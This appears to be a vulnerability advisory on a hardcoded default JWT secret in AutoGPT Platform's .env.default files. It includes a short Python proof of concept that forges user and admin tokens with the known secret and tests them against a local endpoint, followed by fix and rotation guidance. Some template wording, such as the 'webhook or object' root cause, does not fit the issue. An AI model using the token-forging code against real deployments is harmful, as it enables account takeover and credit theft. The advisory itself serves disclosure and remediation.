## 1. Overview

AutoGPT Platform ships with a publicly known, hardcoded default JWT verification key (`your-super-secret-jwt-token-with-at-least-32-characters-long`) in both `backend/.env.default` and `autogpt_platform/.env.default`. Because HS256 is a symmetric algorithm, any attacker who knows the secret can forge valid JWTs for any user ID or admin role — bypassing all authentication and authorization in the platform without any user interaction.

## 2. Technical Details

### 2.1 Root Cause

The affected authentication boundary did not enforce the expected verifier for the stored webhook or object. The vulnerable component is Hardcoded Default JWT Secret / JWT Secret (`backend/.env`).

### 2.2 Affected Code

The advisory identifies the following affected file(s):

- `backend/.env`
- `autogpt_platform/.env`

The advisory/source text also names the following relevant symbols or runtime objects:

- `str`
- `payload`
- `user_token`
- `admin_token`
- `r`

### 2.3 Exploitation Path

Any self-hosted AutoGPT Platform deployment using the default `.env` is affected. An unauthenticated attacker can: 1. Impersonate any user — read/modify agent graphs, execution history, stored credentials, and workspace files 2. Forge admin tokens — access all admin-only routes, manage credits, configure rate limits, and expose system internals 3. Trigger arbitrary agent executions billed to any user 4. Mass-drain user credit balances

### 2.5 Source Evidence

#### Implementation evidence

`autogpt_libs/autogpt_libs/auth/config.py` loads the JWT key from environment:

```
self.JWT_VERIFY_KEY: str = os.getenv(
    "JWT_VERIFY_KEY", os.getenv("SUPABASE_JWT_SECRET", "")
).strip()
self.JWT_ALGORITHM: str = os.getenv("JWT_SIGN_ALGORITHM", "HS256").strip()
```

`.env.default` ships with:

```
JWT_VERIFY_KEY=your-super-secret-jwt-token-with-at-least-32-characters-long
```

Token verification in `autogpt_libs/autogpt_libs/auth/jwt_utils.py`:

```
payload = jwt.decode(
    token,
    settings.JWT_VERIFY_KEY,
    algorithms=[settings.JWT_ALGORITHM],
    audience="authenticated",
)
if admin_only and jwt_payload["role"] != "admin":
    raise HTTPException(status_code=403, detail="Admin access required")
```

With HS256, anyone who knows `JWT_VERIFY_KEY` can sign tokens with arbitrary `sub`, `role`, and `email` claims. A self-hosted deployment that copies `.env.default` to `.env` without changing this value uses the publicly known secret.

Affected commit: `94ebce7f633f40af8fd59e5cdaea75159cf2e6d1`

#### Proof-of-concept evidence

```
import jwt, time, uuid

SECRET = "your-super-secret-jwt-token-with-at-least-32-characters-long"

# Forge a regular user token
user_token = jwt.encode({
    "sub": str(uuid.uuid4()),
    "email": "attacker@evil.com",
    "role": "authenticated",
    "aud": "authenticated",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}, SECRET, algorithm="HS256")

# Forge an admin token
admin_token = jwt.encode({
    "sub": str(uuid.uuid4()),
    "role": "service_role",
    "aud": "authenticated",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}, SECRET, algorithm="HS256")

# Use against any authenticated endpoint
import requests
r = requests.get("http://localhost:8006/api/v1/me",
                 headers={"Authorization": f"Bearer {user_token}"})
# → 200 OK with arbitrary user data
```

Full reproduction: `python3 poc_ts_ag3_001.py --target http://localhost:8006` reproduce.zip

#### Workaround guidance

None.

## 3. Vulnerable Code Pattern

The vulnerable pattern is relying on a static default secret for authentication or credential encryption instead of requiring a deployment-specific secret. A known secret collapses the intended trust boundary for tokens, signatures, or encrypted values that depend on it.

## 4. The Fix

Fix strategy:

- Upgrade AutoGPT to `0.8.0` or a later release containing the patch.
- Apply the source-stated remediation: The default `JWT_VERIFY_KEY` was removed from `backend/.env.default` and HS* tokens are rejected outright.
- Apply the source-stated remediation: None.
- Remove insecure default secrets and require operators to provide deployment-specific secrets.
- Fail startup or refuse sensitive operations when the secret is missing, empty, or still set to a known default.
- Document rotation steps for credentials or tokens protected by the affected secret.
- Use the linked PR or commit as the authoritative patch reference when backporting the fix to a self-hosted deployment.

Validation and regression checks:

- A deployment using a known default secret should fail startup or refuse the sensitive operation.
- A deployment configured with a fresh secret should keep authentication or decryption behavior working.
- Rotation guidance should be followed for tokens, sessions, or encrypted credentials protected by the old secret.

Operational follow-up:

- Inventory self-hosted AutoGPT deployments and confirm whether their running version falls inside the affected range.
- If an immediate upgrade is not possible, backport the same validation, authorization, or dependency constraint shown by the linked fix material.
- Rotate any credentials, tokens, cookies, or encrypted material that may have crossed the affected trust boundary.
